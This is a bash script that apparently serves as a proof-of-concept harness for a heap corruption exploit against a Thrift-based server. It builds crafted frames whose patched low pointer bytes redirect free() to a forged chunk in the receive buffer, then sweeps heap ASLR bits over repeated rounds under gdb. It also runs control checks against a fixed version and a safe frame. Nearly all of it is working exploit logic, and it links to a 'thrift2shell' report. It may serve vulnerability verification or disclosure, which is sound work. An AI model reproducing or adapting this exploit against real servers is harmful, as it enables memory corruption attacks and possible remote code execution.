#!/bin/bash
# Wire-chosen low 16 bits redirect free() to a forged valid chunk inside the
# receive buffer. ASLR randomizes heap bits 12-15, so each run sweeps the
# sixteen low words 0x?3f0 and repeats rounds until one lands at rBuf+512.
# Loopback only; needs live-noflush and live-noflush-fixed (build commands in
# reports/thrift2shell-livewire.md). Prints address-free normalized evidence.
set -u
cd "$(dirname "$0")" || exit 1
mkdir -p results
tmp=$(mktemp -d /tmp/thrift-fakechunk.XXXXXX)
trap 'rm -rf "$tmp"' EXIT
port=29900
winner=""
rm -f results/fakechunk-{vuln,fixed,safe}.log results/fakechunk-{before,after}.bin \
      results/fakechunk-normalized.txt

for round in 1 2 3 4 5 6; do
  for hi in 0 1 2 3 4 5 6 7 8 9 a b c d e f; do
    low="${hi}3f0"
    bytes="${low:2:2}${low:0:2}"
    frame="$tmp/kv-fc-$low.bin"
    python3 make-kv-frame.py "$frame" --base kv-ptr14.bin --plain-len 312 \
      --patch 21=0000011c --patch 310="$bytes" \
      --patch 214=3100000000000000 --patch 278=2100000000000000 \
      --patch 230=a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5 --pad-compressed 160 >/dev/null
    port=$((port+1))
    rm -f results/fakechunk-before.bin results/fakechunk-after.bin
    log="$tmp/gdb-$low.log"
    timeout 12 gdb -q -batch -ex "set \$want=0x$low" -x gdb-fakechunk.gdb \
      --args ./live-noflush server-noflush "$port" >"$log" 2>&1 &
    gpid=$!
    sleep 1
    python3 raw-client.py "$port" "$frame" 1 >/dev/null 2>&1
    # The accepted free writes after.bin within a couple of seconds; stop the
    # debugger as soon as it appears instead of waiting out its timeout.
    for poll in 1 2 3 4 5 6 7 8; do
      if [ -f results/fakechunk-after.bin ] && grep -q WANTFREE "$log"; then break; fi
      if ! kill -0 "$gpid" 2>/dev/null; then break; fi
      sleep 0.5
    done
    if [ -f results/fakechunk-after.bin ] && grep -q WANTFREE "$log"; then
      kill "$gpid" 2>/dev/null || true
      wait "$gpid" 2>/dev/null || true
      cp "$log" results/fakechunk-vuln.log
      winner="$low"
      break 2
    fi
    wait "$gpid" 2>/dev/null || true
  done
done

if [ -z "$winner" ]; then
  echo "NO_ACCEPTED_CHOSEN_FREE after 6 rounds" >&2
  exit 1
fi

# Controls: fixed v0.24.0 with the winning frame, safe frame on v0.23.0.
timeout 10 ./live-noflush-fixed server-noflush 29990 \
  >results/fakechunk-fixed.log 2>&1 &
pid=$!
sleep 1
python3 raw-client.py 29990 "$tmp/kv-fc-$winner.bin" 1 >/dev/null 2>&1
wait "$pid" || true

timeout 8 ./live-noflush server-noflush 29991 >results/fakechunk-safe.log 2>&1 &
pid=$!
sleep 1
python3 raw-client.py 29991 kv-partial-safe.bin 1 >/dev/null 2>&1
wait "$pid" || true

python3 normalize-fakechunk.py >"$tmp/normalized.txt" || exit 1
cp "$tmp/normalized.txt" results/fakechunk-normalized.txt
cat results/fakechunk-normalized.txt
sha256sum results/fakechunk-normalized.txt
echo "WINNER_LOW_WORD=0x$winner"
